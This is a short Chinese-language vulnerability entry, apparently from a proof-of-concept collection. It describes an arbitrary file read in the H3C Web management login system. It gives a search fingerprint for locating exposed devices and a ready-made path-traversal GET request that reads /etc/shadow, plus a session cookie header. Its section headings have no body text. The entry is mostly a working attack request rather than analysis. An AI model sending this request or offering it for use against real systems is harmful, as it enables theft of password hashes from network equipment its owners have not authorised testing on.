# H3CWeb网管登录系统jQuery-1.7.2存在任意文件读取

- **系统**：H3CWeb　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`web.body="webui/js/jquerylib/jquery-1.7.2.min.js"`
- **请求**：`GET /webui/?g=sys_dia_data_down&file_name=../../../../../etc/shadow HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: USGSESSID=a9523e6ede287f558817c3bbcf9a60be`

**请求体 / payload**
```

```

**其他**
- H3C Web网管登录系统jQuery-1.7.2存在任意文件读取: * 一、漏洞简介
  * 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * H3C用户网管登录系统